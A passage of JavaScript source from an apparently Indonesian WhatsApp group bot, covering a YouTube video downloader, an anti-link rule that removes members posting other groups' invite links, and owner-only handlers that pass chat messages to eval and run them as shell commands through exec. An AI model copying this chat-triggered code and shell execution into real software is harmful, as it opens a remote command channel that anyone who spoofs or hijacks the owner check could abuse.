let isLinks= args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks) return m.reply(`Linknya Jelek`)
m.reply(mess.wait)
anu = await ytMp4(`${q}`)
titlenyaa = `TITLE BERHASIL DI DAPATKAN\n\nJudul : ${anu.title}\nUpload : ${anu.uploadDate}\nSize : ${anu.size}\nViews : ${anu.views}\nLike : ${anu.likes}\nDislike : ${anu.dislike}\nChannel : ${anu.channel}\nDeskripsi : ${anu.desc}\n\nMOHON TUNGGU SEDANG MENGIRIM MEDIA`
diablo.sendMessage(m.chat, { image: { url: anu.thumb }, caption: `${titlenyaa}`}, { quoted: m })
diablo.sendMessage(m.chat, { video: { url: anu.result }, mimetype: 'video/mp4', fileName: `${anu.title}.mp4` }, { quoted: m })

break
default:
if (global.db.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await diablo.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (itsMediablo) return m.reply(`Ehh maaf kamu owner bot ku`)
        diablo.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
}
if (budy.startsWith('=>')) {
if (!itsMediablo) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
if (budy.startsWith('>')) {
if (!itsMediablo) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMediablo) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMediablo) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}
} catch (err) {
m.reply(util.format(err))
}
} 